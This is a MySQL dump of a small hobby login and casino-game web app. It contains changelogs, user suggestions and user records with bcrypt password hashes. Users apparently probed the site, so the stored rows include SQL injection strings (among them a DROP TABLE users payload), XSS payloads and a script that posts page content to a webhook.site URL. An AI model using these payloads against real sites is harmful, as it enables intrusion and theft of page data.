CREATE DATABASE  IF NOT EXISTS `login_app` /*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci */;
USE `login_app`;
-- MySQL dump 10.13  Distrib 8.0.42, for Win64 (x86_64)
--
-- Host: localhost    Database: login_app
-- ------------------------------------------------------
-- Server version	5.5.5-10.11.11-MariaDB-0+deb12u1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `changelogs`
--

DROP TABLE IF EXISTS `changelogs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `changelogs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `version` varchar(50) NOT NULL COMMENT 'Contoh: v1.0.1, Build 20250415',
  `description` text NOT NULL COMMENT 'Detail perubahan pada versi ini',
  `update_date` date NOT NULL COMMENT 'Tanggal update versi ini',
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `idx_update_date` (`update_date`) COMMENT 'Index untuk sorting berdasarkan tanggal'
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='Tabel untuk menyimpan riwayat perubahan versi';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `changelogs`
--

LOCK TABLES `changelogs` WRITE;
/*!40000 ALTER TABLE `changelogs` DISABLE KEYS */;
INSERT INTO `changelogs` VALUES (3,'V.1.1.0','- Added the main website','2025-04-11','2025-04-14 17:34:38','2025-04-14 17:44:53'),(4,'V.1.2.0','- Added database\r\n- Added phpmyadmin','2025-04-11','2025-04-14 17:35:33','2025-04-14 17:45:01'),(5,'V.1.3.0','- Added register page\r\n- Added dashboard(under construction)\r\n- Fix database\r\n- Removed phpmyadmin','2025-04-12','2025-04-14 17:37:31','2025-04-14 17:45:07'),(6,'V.1.3.1','- Added mobile support\r\n- Fix some codes','2025-04-12','2025-04-14 17:39:06','2025-04-14 17:45:16'),(7,'V.1.0.0','Initial commit','2025-01-13','2025-04-14 17:40:59','2025-04-14 17:40:59'),(8,'V.1.4.0','- Added Autentication\r\n- Added role for user\r\n- Added role for admin\r\n- Added Admin Dashboard\r\n- Added Sugestion Page\r\n- Added my SQL on a text(not the latest one)\r\n- Added logout\r\n- Fix the Folder system\r\n- Fix some codes','2025-04-13','2025-04-14 17:46:45','2025-04-14 17:46:45'),(9,'V.1.4.1','- Added Favicons\r\n- Added homepage\r\n- Changes on some tittle pages','2025-04-13','2025-04-14 17:47:26','2025-04-14 17:49:33'),(10,'V.1.4.2','- Added Changelogs\r\n- Added Changelogs panel for the Admin\r\n- Added 403 error\r\n- Updated the database source\r\n- Fix some codes','2025-04-15','2025-04-14 17:47:57','2025-04-14 17:47:57'),(11,'V.1.5.0','- Added currency system\r\n- Added profile\r\n- Added menu\r\n- Moved the changelogs\r\n- Removed dashboard','2025-04-15','2025-04-15 15:48:31','2025-04-15 15:48:31'),(12,'V.1.6.0','- Added Casino page\r\n- Added Slots system','2025-04-20','2025-04-20 15:26:32','2025-04-20 15:26:32'),(13,'V.1.6.1','- Added Slots icon\r\n- Added cooldown in Slots\r\n- Fixed the pay table\'s odds in Slots','2025-04-20','2025-04-20 15:46:04','2025-04-20 15:49:31'),(14,'V.1.7.0','- Redesigned the site(in progress)','2025-04-30','2025-04-30 15:33:12','2025-04-30 15:33:12');
/*!40000 ALTER TABLE `changelogs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `game_state`
--

DROP TABLE IF EXISTS `game_state`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `game_state` (
  `key_name` varchar(50) NOT NULL COMMENT 'Nama state, cth: vault_slots',
  `value` bigint(20) NOT NULL DEFAULT 0 COMMENT 'Nilai state',
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  PRIMARY KEY (`key_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='Menyimpan state game global';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `game_state`
--

LOCK TABLES `game_state` WRITE;
/*!40000 ALTER TABLE `game_state` DISABLE KEYS */;
INSERT INTO `game_state` VALUES ('vault_slots',44444100,'2025-05-02 15:27:23');
/*!40000 ALTER TABLE `game_state` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `suggestions`
--

DROP TABLE IF EXISTS `suggestions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `suggestions` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `suggestion_text` text NOT NULL,
  `submitted_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `suggestions_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=17 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `suggestions`
--

LOCK TABLES `suggestions` WRITE;
/*!40000 ALTER TABLE `suggestions` DISABLE KEYS */;
INSERT INTO `suggestions` VALUES (1,1,'lorem ipsum sit amet','2025-04-13 13:05:59'),(2,2,'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque eu libero vel libero ornare molestie at ac nunc. Donec pellentesque augue non ante porttitor tincidunt. Donec posuere dui dolor, in bibendum felis varius ut. Aliquam id cursus felis, hendrerit efficitur arcu. Ut venenatis, metus et fermentum lobortis, neque mi rhoncus erat, quis pellentesque leo justo ornare arcu. Duis molestie dignissim orci, id blandit ipsum suscipit at. Nullam pretium magna nec ante consectetur luctus. Maecenas consectetur accumsan neque, eu euismod dui pulvinar quis. Fusce ut elit orci.\r\n\r\nAliquam aliquet, libero non varius vestibulum, magna eros lobortis neque, sit amet molestie est enim non lorem. Aliquam tincidunt at purus et semper. Sed nec mattis mauris. Suspendisse potenti. Aliquam luctus mi lacinia, facilisis mi nec, pretium mauris. Aliquam et lacus et magna semper pulvinar in facilisis mauris. Cras ultrices efficitur eros vitae vestibulum. Curabitur in ante in erat consequat pellentesque. Suspendisse potenti. Nullam eleifend enim eu elementum varius. Donec consequat dolor sagittis egestas rutrum. Mauris faucibus odio vitae risus consectetur suscipit quis fermentum lacus. In nec nulla ipsum. Etiam ultrices mollis pellentesque. Mauris bibendum lacus nibh, vulputate posuere elit lacinia eu.\r\n\r\nCras mattis hendrerit metus, a mattis neque consectetur id. Morbi massa nibh, hendrerit placerat elementum nec, porta vitae ex. Vestibulum viverra, neque vel finibus rutrum, libero mauris tincidunt leo, nec euismod enim tellus id odio. Duis nec sollicitudin dolor, at ultrices nibh. In at turpis id dui hendrerit mattis nec id tortor. Duis lacinia ligula ac eros pulvinar pellentesque. Aliquam aliquam ipsum libero, sed blandit lectus volutpat sed. Morbi ut turpis sit amet quam commodo porttitor non id lacus.\r\n\r\nDonec vel nulla leo. Fusce tempus in odio at lobortis. Morbi volutpat consequat diam, hendrerit consequat quam pharetra eget. Duis dapibus ultricies massa, in mattis ipsum semper semper. Donec consequat non nibh sed lobortis. Integer quis turpis felis. Quisque neque mauris, iaculis nec sodales quis, pretium eget nunc. Phasellus lacinia felis ac erat hendrerit malesuada. Proin sodales, mauris sed tristique bibendum, sapien erat venenatis elit, eu rutrum nunc nisl at erat. Fusce porta, tortor egestas iaculis vestibulum, lorem mauris dictum odio, sit amet malesuada lacus nisi quis lorem. Mauris faucibus tellus vitae metus iaculis dictum. Proin tempor enim massa, sed tincidunt elit malesuada id.\r\n\r\nDuis rhoncus lacus at velit maximus malesuada. Quisque in commodo mi. Cras feugiat iaculis ex sed finibus. Nam placerat ante sit amet pharetra vulputate. Nullam porttitor dapibus neque, varius sodales lectus porta sit amet. Nunc vitae ligula id dui aliquet tincidunt ut eu dolor. Fusce bibendum orci ac ligula lobortis, suscipit accumsan sem euismod. Praesent et velit lacus. Aenean rutrum nisi et erat congue, in hendrerit turpis pretium. In nec interdum libero, in ullamcorper tortor. Interdum et malesuada fames ac ante ipsum primis in faucibus.','2025-04-13 13:09:53'),(3,5,'bikin live view pengunjung kak rayokk (today, yesterday, this week, all time)','2025-04-14 04:57:03'),(4,5,'Link promosi judi bisa gak bang rayox','2025-04-14 05:00:12'),(5,5,'bg rayox\r\nkontol','2025-04-14 05:00:41'),(6,5,'Fitur bagi tugas','2025-04-14 05:01:11'),(7,5,'halo, saran','2025-04-15 02:12:05'),(8,5,'open your eyes, look up on the skies and see...','2025-04-15 02:12:51'),(9,15,'layout kurang menarik','2025-04-17 01:25:23'),(10,16,'\' UNION SELECT null, null, null--','2025-04-21 07:25:47'),(11,16,'phei','2025-04-21 07:34:01'),(12,16,'<script>alert(\'XSS\')</script>','2025-04-21 07:35:14'),(13,16,'<img src=x onerror=alert(1)>','2025-04-21 07:36:15'),(14,16,'<script>alert(\'XSS\')</script>','2025-04-21 07:36:53'),(15,2,'<script>CREATE DATABASE aplikasi_baru;(\'XSS\')</script>','2025-04-21 07:40:49'),(16,16,'<script>\r\nfetch(\'https://webhook.site/your-id\', {\r\n  method: \'POST\',\r\n  body: document.body.innerHTML\r\n});\r\n</script>','2025-04-21 07:41:10');
/*!40000 ALTER TABLE `suggestions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `role` varchar(10) NOT NULL DEFAULT 'user',
  `money` bigint(20) NOT NULL DEFAULT 50000 COMMENT 'Jumlah uang in-game user',
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=19 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'test','$2y$10$Rsjn0x6VpvmNHrE/0bEwC.ewX4RpEqYuajpr7/0XqDsmEPL08mMFu','user',0,'2025-04-13 12:54:37'),(2,'RayhanAdmin','$2y$10$Rsjn0x6VpvmNHrE/0bEwC.ewX4RpEqYuajpr7/0XqDsmEPL08mMFu','admin',372234760,'2025-04-13 13:06:57'),(3,'Kontol ','$2y$10$b1Dpk.YVcHxDNHn/lb0UsOBBMRb8BTUBOKwQgXQl96qMBIdCV8aV.','user',29020,'2025-04-13 13:53:56'),(5,'pekobb','$2y$10$NsGOgSzLuZDFj71BI.xGnuOwqDVM5nmBiiutbs31fVlWEUnwLxFky','user',6869000,'2025-04-14 04:55:43'),(6,'rizki','$2y$10$VOb0LHpDwBzrZ3NKcCqfkuBQqM3qvvZo/vP/xj7I6aD2neGwrAhqK','user',50000,'2025-04-16 03:06:19'),(7,'susu','$2y$10$qRP0KlnwjOlCzTIoYPs4oehV4zHWVP.rxniscuxkuS2GZT9hX3OPS','user',0,'2025-04-16 03:08:29'),(8,'rehan123','$2y$10$6LBuPev3wz4Chu8J51sFd.mgSJ54FW8RB1s52aYew2rMuGgh.pWW2','user',0,'2025-04-16 03:09:20'),(9,'vexura','$2y$10$89g1mbOmSVq1xRh7yS/5JujZW0.Amj4hTCNelIa7wtw5pKQgvfj.m','user',5000,'2025-04-16 03:10:03'),(10,'<script>alert(1)</script>','$2y$10$BkS0Tx0VqYMe73tS8tiUnerragO5C83EXBZoa2wimVjeBHWNMhIaq','user',1000,'2025-04-16 04:12:12'),(11,'\' OR 1=1 --\'','$2y$10$SfVCWDan3Ad7Bobhy3apwOtkm66tS2sS3Tzf5zMFieLKMo7moZiLK','user',1000,'2025-04-16 04:26:23'),(12,'\' OR 1=1 --','$2y$10$N1Nz.NdxsWW5hxYpYN2.Bu4z6WEARmfNkNRmoKPe4CVdjDOjnbdQe','user',1000,'2025-04-16 04:28:57'),(13,'\' OR 1=1; DROP TABLE users; --','$2y$10$lLs/a0BDmh.ydYVBVWV2jukMzkcFxPBLL7kOF/I3O07y/hsPaoeeu','user',1000,'2025-04-16 05:03:32'),(14,'tess','$2y$10$GsqKPcd3nWZd67KqL9/mH.N9CBvwpA8O6mV4rkQ.8cSRSkzijyoy.','user',0,'2025-04-17 00:33:09'),(15,'dontol','$2y$10$hY3b3G7kN38nVU5owx1TlOvmRNthEYoCyUIeJ554XLPg7R82DoC8e','user',150000,'2025-04-17 01:24:12'),(16,'root','$2y$10$DG7m1NRQ3RcMYvOZGr1/6.1iwiKnYyxRwF0JnwJbx/x2no2M8bbri','user',0,'2025-04-21 07:03:29'),(17,'stellar repet','$2y$10$14ZIMXHrk/KDpoeZ1vg7j.ktIgluz6kETzZ.z1ieU4OkKK0s80P86','user',296707350,'2025-04-21 07:11:03'),(18,'Pakota','$2y$10$jovzO8kjQwebPrqpoK4vbuG1BFkad4W7TPmzI.wdsA6SUaBRsFFt2','user',78990,'2025-04-21 08:02:07');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2025-05-03 15:35:25
